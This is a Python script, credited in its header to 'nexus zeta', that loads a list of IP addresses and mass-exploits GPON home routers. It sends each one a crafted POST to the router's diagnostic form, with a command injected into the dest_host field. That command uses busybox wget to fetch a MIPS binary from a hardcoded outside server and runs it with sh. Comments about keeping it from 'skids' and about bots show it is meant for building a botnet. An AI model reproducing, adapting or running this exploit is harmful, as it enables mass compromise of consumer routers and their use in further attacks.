#!/usr/bin/python

# gpon exploit loader by nexus zeta ; if ive sent u this dont give this to skids - use your head dont get bots saturated
# note to self: reintegrate parallelized thread pool alongside queue / gevent? (maybe)

import sys, socket, time, os, ssl
from Queue import *
#from multiprocessing.dummy import Pool as ThreadPool
#from multiprocessing import Process
from threading import Thread
from sys import stdout

if len(sys.argv) < 2:
        print "Usage: python "+sys.argv[0]+" <list>"
        sys.exit()

port = 443
buf = 4096
count = 0
queue = Queue()
post_data = "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=$(busybox+wget+http://46.183.218.243/mips+-O+->+/dev/r;sh+/dev/r)&ipv=0\r\n"
headers = "POST /GponForm/diag_Form?style/ HTTP/1.1\r\nHost: 192.168.0.1:443\r\nUser-Agent: curl/7.3.2\r\nAccept: */*\r\nxAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nContent-Type: text/plain\r\nContent-Length: "+str(len(post_data))+"\r\n\r\n"+str(post_data)
#headers = "POST /GponForm/diag_Form?images/ HTTP/1.1\r\nHost: 192.168.0.1:443\r\nUser-Agent: curl/7.3.2\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nContent-Type: text/plain\r\nContent-Length: "+str(len(post_data))+"\r\n\r\n"+str(post_data)
i = 0
ips = open(sys.argv[1], "r").readlines()

def gpwn(host):
    global i
    host = host.strip("\n")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s = ssl.wrap_socket(sock)
	s.settimeout(3)
        s.connect((host, port))
        s.send(headers)
	time.sleep(5)
        print "\x1b[1;35m[\x1b[1;36mGPON\x1b[1;35m] \x1b[1;37m- \x1b[1;35m[\x1b[1;32m%s\x1b[1;35m] \x1b[1;37m- \x1b[1;35m[\x1b[1;32mDEPLOYING\x1b[1;35m]" % (host)
        resp = s.recv(buf).strip()
        if "200 OK" in resp:
            i += 1
        s.close()
    except:
        pass
    return
def load_to_queue():
    global count
    for line in ips:
        count += 1
        line = line.strip("\r\n")
        sys.stdout.write("\r[%d] Added to queue" % (count))
        sys.stdout.flush()
        queue.put(line)
    sys.stdout.write("\n")

def main():
    load_to_queue()
    i = 0
    while i < count:
        i += 1
        try:
            ip = queue.get()
            f = Thread(target=gpwn, args=(ip,))
            f.start()
            queue.task_done()
        except KeyboardInterrupt:
            os.kill(os.getpid(),9)
        except Exception as i:
            print i
            pass
if __name__ == "__main__":
    main()
